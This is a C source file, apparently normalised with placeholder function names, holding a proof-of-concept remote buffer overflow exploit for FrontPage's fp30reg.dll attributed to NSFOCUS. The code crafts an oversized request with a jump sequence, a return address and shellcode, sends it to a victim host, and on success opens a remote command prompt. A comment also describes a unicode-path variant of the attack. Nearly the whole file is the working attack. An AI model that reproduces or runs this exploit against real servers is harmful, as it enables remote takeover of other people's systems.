#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  overbuff ;
typedef  int /*<<< orphan*/  buff ;

/* Variables and functions */
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (char*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 scalar_t__ FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 scalar_t__ FUNC9 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,char*,char*,char*,int,char*) ; 
 int /*<<< orphan*/  FUNC12 (char*,char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*) ; 
 int FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC16 (int,char*,int) ; 

FUNC17 (int argc, char **argv)
{
  char overbuff[400];
  char buff[4096];

/* If system has the unicode bug, it is possible to attack fp4areg.dll */
/* char fppath[] = "/_vti_bin/..%c1%9cbin/fp4areg.dll"; */

  char fppath[] = "/_vti_bin/_vti_aut/fp30reg.dll";
  char server[] = "www.blahblah.com";
  char retaddress[] = "\x62\x18\xd5\x67";
  char jmpshell[] = "\xff\x66\x78";
  int  i, sockfd;
  int port = 80;

  if (argc < 2)
    {
      FUNC8 ("Proof of concept code for fp30reg.dll overflow bug by NSFOCUS Security Team\n\n");
      FUNC8 ("Usage: %s victim [port]\n", argv[0]);
      FUNC4 (-1);
    }

  if (argc > 2) port = FUNC0 (argv[2]);

  sockfd = FUNC3 (argv[1], port);

  FUNC1 (overbuff, sizeof (overbuff));
  FUNC1 (buff, sizeof (buff));
  FUNC7 (overbuff, 'a', 258);
  FUNC6 (overbuff, jmpshell, FUNC14 (jmpshell));
  FUNC13 (overbuff + 258, "%c");
  for (i = 0; i < 0x50; i += 4)
      FUNC15 (overbuff, retaddress, 4);
  FUNC12 (overbuff, "aaa");

  FUNC11 (buff,
           "GET %s?%s HTTP/1.1 \nHOST:%s\r\nContent-Type: \
text/html\nContent-Length:%d\r\nProxy_Connection: Keep-Alive\r\n\r\n%s",
           fppath, overbuff, server, FUNC14 (shellcode), shellcode);
  FUNC8 ("buff len = %d\n", FUNC14 (buff));

  FUNC16 (sockfd, buff, FUNC14 (buff));
  FUNC8 ("payload sent!\n");

  if(FUNC9 (sockfd, buff, FUNC14(buff))<0)
  {
    FUNC8("EOF\n");
    FUNC4(-1);
  }
  else 
  {
    if(FUNC5(buff,"XORDATA",8)==0)
    {
     FUNC8("exploit succeed\n");
     /* Press Enter key to get the command prompt */
     FUNC10 (sockfd);
    }
    else
    {
     FUNC8("exploit failed\n");
     FUNC2(sockfd);
     FUNC4(-1);
    }
  }

}